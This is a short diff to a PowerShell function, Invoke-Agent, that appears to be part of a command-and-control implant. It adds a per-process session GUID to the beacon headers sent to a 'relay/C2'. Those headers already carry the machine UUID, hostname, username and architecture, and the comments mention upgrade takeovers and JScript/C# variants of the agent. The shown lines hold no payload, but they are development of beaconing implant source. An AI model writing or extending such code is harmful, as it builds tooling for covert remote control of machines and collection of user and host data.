@@ -165,9 +165,17 @@ function Invoke-Agent {
         # fallback fails it is omitted and the relay treats the agent as identity-less.
         # There is NO Bitness header — the process arch already carries the full width,
         # and x86_64/aarch64 are both 64-bit.
+        # Per-RUNTIME session key — a random GUID minted ONCE per process (BuildIdentity
+        # runs a single time, before the beacon loop) and sent on every beacon, so the
+        # relay/C2 can tell agent RUNTIMES apart on one machine: the machine uuid stays
+        # THE identity rows are keyed by, the session key distinguishes concurrent or
+        # succeeding processes (an upgrade takeover swaps it mid-session). It identifies,
+        # authorizes nothing. The same contract the JScript/C# breeds ship.
+        $sessionKey = [guid]::NewGuid().ToString('D')
         $pairs = @(
             @('X-Agent-Api-Version', '1'),
             @('X-Agent-Machine-Uuid', $guid),
+            @('X-Agent-Session-Key', $sessionKey),
             @('X-Agent-Hostname', (ReadEnv 'COMPUTERNAME')),
             @('X-Agent-Username', (ReadEnv 'USERNAME')),
             @('X-Agent-Arch', $arch),
